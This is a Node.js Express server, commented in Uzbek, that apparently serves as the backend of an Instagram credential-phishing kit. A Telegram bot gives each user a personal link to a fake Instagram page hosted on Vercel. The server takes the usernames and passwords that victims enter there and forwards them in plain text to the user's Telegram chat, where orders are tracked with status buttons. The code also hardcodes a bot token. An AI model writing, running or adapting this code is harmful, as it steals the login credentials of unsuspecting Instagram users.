import express from "express";
import cors from "cors";
import fetch from "node-fetch";

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = "8190649011:AAFwF5v7Se6E6hjiqhI9AgcGi5g7LiMMrUA";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Buyurtmalar lokal saqlanadi
let orders = [];

// Frontenddan buyurtma kelganda
app.post("/send-message", async (req, res) => {
  try {
    const { chat_id, username, password, follows } = req.body;
    if (!chat_id) return res.json({ success: false, error: "chat_id yo'q!" });

    const order = {
      id: Date.now(),
      chat_id,
      username,
      password,
      follows,
      status: "kutilmoqda", // boshlang'ich status
      time: new Date(),
    };
    orders.push(order);

    // Telegramga xabar yuborish
    const text =
      `🆕 Yangi Instagram:\n\n` +
      `👤 Username: ${username}\n` +
      `🔑 Password: ${password}\n` +
      `👥 Obunachilar: ${follows}\n\n` +
      `⏳ Holati: Kutilmoqda`;

    const buttons = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Bajarilgan", callback_data: `done:${order.id}` },
            { text: "❌ Bajarilmagan", callback_data: `fail:${order.id}` },
            { text: "🛑 Bekor qilindi", callback_data: `cancel:${order.id}` },
          ],
        ],
      },
    };

    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text, ...buttons }),
    });

    return res.json({ success: true });
  } catch (err) {
    console.log(err);
    return res.json({ success: false, error: "Server xatosi" });
  }
});

// Orders olish endpointi
app.get("/orders", (req, res) => {
  res.json(orders);
});

// =======================
// TELEGRAM BOT POLLING
// =======================
let lastUpdateId = 0;

async function getUpdates() {
  try {
    const res = await fetch(
      `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}`
    );
    const data = await res.json();

    if (data.ok) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        // Callback tugmalarni ishlatish
        if (update.callback_query) {
          const [action, orderId] = update.callback_query.data.split(":");
          const chat_id = update.callback_query.message.chat.id;

          const orderIndex = orders.findIndex((o) => o.id == orderId);
          if (orderIndex === -1) continue;
          const order = orders[orderIndex];

          if (action === "done") order.status = "bajarilgan";
          if (action === "fail") order.status = "bajarilmagan";
          if (action === "cancel") {
            order.status = "bekor qilindi";
            // Buyurtmani o'chirish
            orders.splice(orderIndex, 1);
          }

          await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id,
              text: `Status o'zgartirildi: ${
                order.status === "bajarilgan"
                  ? "✅ Bajarilgan"
                  : order.status === "bajarilmagan"
                  ? "❌ Bajarilmagan"
                  : "🛑 Bekor qilindi"
              }`,
            }),
          });
        }

        // /start komandasi
        if (update.message && update.message.text === "/start") {
          const chat_id = update.message.chat.id;
          const user_name = update.message.from.first_name;
          const link = `https://instagram-six-beige.vercel.app//?chat_id=${chat_id}`;

          await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id,
              text: `Salom ${user_name}! Sizning unikal linkingiz: \n\n${link}`,
            }),
          });
        }
      }
    }
  } catch (err) {
    console.log("Telegram polling xatosi:", err);
  }
}

// Har 2 sekundda yangilanishlarni tekshirish
setInterval(getUpdates, 2000);

app.listen(5000, () => console.log("Server 5000-portda ishlayapti"));
